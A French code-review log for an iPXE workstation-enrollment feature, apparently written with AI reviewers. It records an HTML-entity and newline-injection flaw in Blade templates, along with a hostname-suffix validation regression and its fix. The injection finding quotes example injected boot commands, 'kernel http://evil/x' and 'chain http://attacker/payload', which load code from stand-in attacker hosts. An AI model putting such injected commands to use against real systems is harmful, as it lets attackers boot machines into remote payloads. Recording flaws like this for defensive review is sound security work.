### #F2 — `{{ }}` Blade en `text/plain` iPXE → entités HTML / newline injection

**Sévérité** : 🔴 Critique (Sonnet) — 3/3 (Opus, confirmé fortement)
**Fichier(s)** : `resources/views/ipxe/enrollment/name.blade.php:18,25,29,35,40` (+ probablement byod.blade.php cf. Opus-1)

**Constat initial (Sonnet)** :
Le template utilise `{{ $result->sanitizedName }}` et `{{ $result->reasonLabel }}` avec interpolation Blade qui applique `htmlspecialchars()`. Pour un flux `text/plain` iPXE, cela peut produire `&amp;`, `&#039;` qui cassent l'affichage firmware. Incohérent avec 3.1/3.2 qui passent par `sanitizeAscii()`.

**Avis Opus (3/3)** :
Confirmé fortement. Au-delà des entités HTML, la **newline injection** est exploitable : `{{ }}` n'échappe PAS les `\n`/`\r`. Si `sanitizedName` ou `reasonLabel` contient une newline (via un payload qui passe le sanitizer mais conserve un control char exotique), un attaquant peut injecter une commande iPXE supplémentaire (`kernel http://evil/x`, `chain http://attacker/payload`). Voir aussi **Opus-1** pour le flow BYOD encore plus vulnérable.

**Solutions possibles** :
1. **[Recommandée Opus]** Sanitizer dans les factories `EnrollNameResult::*()` pour garantir invariant côté value object (source de vérité unique).
2. Sanitizer dans `IpxeEnrollmentMenuBuilder` avant injection variables Blade (cohérence iso 3.1/3.2).
3. Côté template `{!! e(sanitizeAscii(...)) !!}` (verbeux, risque d'oubli).

**Action** : ⏳ Q2 — attente arbitrage Henri (puis correction auto englobant F2 + Opus-1).

### #Opus-2 — `applyHostnameSuffix` + `isValidHostname` régression silencieuse si suffix configuré

**Sévérité** : 🟠 Important
**Fichier(s)** : `app/Ipxe/Services/IpxeHostnameSanitizer.php:37,103-124`, `app/Ipxe/Services/WorkstationEnrollmentService.php:96-100`

**Constat (Opus)** :
`applyHostnameSuffix` tronque à 9 chars puis concatène le suffix (peut produire > 15 chars, parité legacy stricte). Mais `isValidHostname` rejette tout nom > 15 chars (`{1,15}`). Conséquence : sur tout déploiement avec `config('sambaedu.legacy_ldap.suffix')` non vide, dès qu'un nom dépasse 6 chars effectifs (9+suffix de 7+ = 16+), TOUS les enrollments retournent `DbError` avec `reason='nom invalide'`. Régression silencieuse — le legacy n'avait pas ce check 15.

**Pourquoi Sonnet l'a manqué** : Le test `it_appends_suffix_and_truncates_to_9_chars_when_suffix_set` produit `mylongmac-x123abc` (17 chars) mais ne vérifie PAS qu'il passe `isValidHostname`. Chaîne d'usage `sanitize → applyHostnameSuffix → isValidHostname` testée uniquement avec suffix `''`.

**Solutions possibles** :
1. **[Recommandée Opus]** Augmenter `HOSTNAME_REGEX` à `{1,32}` + doc dans `IpxeHostnameSanitizer` (NetBIOS 15 = legacy, samba-tool accepte 64). Ajouter test `it_validates_suffixed_names_with_long_suffix`.
2. Tronquer post-suffix à 15 chars (casse parité legacy `add_hostname_suffix`).

**Action** : ✅ Corrigé — arbitrage Henri 2026-05-20 : option (a).
- `HOSTNAME_REGEX` passe de `{1,15}` à `{1,32}` (char-set strict inchangé).
- Test `it_rejects_empty_and_oversize_hostname` ajusté (16 → 33 chars pour le rejet).
- Tests ajoutés : `it_accepts_hostname_up_to_32_chars` et `it_validates_hostname_produced_by_apply_suffix_with_long_legacy_suffix` (couvre la chaîne `sanitize → applyHostnameSuffix → isValidHostname` avec suffix long).
